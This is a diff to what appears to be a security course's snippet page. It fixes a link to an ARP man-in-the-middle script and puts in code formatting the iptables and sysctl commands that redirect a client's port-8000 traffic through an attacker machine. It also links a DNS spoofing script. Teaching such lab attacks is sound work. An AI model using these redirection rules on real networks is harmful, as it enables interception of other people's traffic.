@@ -64,13 +64,13 @@ This page contains code snippets regularly used in class.
 -->
 
 #### ARP
-- man in the middle atacks: [mintm.py]() 
+- man in the middle atacks: [mintm.py](arp\mintm.html)
 - Add firewall rule on the client
-  - sudo iptables -t nat -A OUTPUT -p tcp --dport 8000 -j DNAT --to-destination _attacker_ip_address_
+  - ```sudo iptables -t nat -A OUTPUT -p tcp --dport 8000 -j DNAT --to-destination _attacker_ip_address_```
 - Rules on the attacker
-  - sudo sysctl -w net.ipv4.ip_forward=1
-  - sudo iptables -t nat -A PREROUTING -p tcp --dport 8000 -j DNAT --to-destination _server_ip_address_
-  - sudo iptables -t nat -A POSTROUTING -j MASQUERADE
+  - ```sudo sysctl -w net.ipv4.ip_forward=1```
+  - ```sudo iptables -t nat -A PREROUTING -p tcp --dport 8000 -j DNAT --to-destination _server_ip_address_```
+  - ```sudo iptables -t nat -A POSTROUTING -j MASQUERADE```
 
 #### DNS
 - [dns_spoof.py](dns\dns_spoof.html)
